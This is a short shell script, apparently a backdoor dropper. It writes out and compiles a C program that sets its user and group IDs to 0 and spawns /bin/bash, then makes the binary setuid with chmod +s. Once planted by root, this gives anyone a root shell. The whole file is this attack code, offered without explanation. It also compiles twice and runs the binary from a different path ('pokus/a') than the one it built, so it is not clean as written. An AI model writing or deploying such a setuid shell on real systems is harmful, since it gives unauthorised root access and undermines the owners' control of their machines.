#!/bin/sh

cat > a.c << _EOF
main()
{
setuid(0);
setgid(0);
system("/bin/bash");
}
_EOF

make a
cc a.c -o a
chmod +s a
pokus/a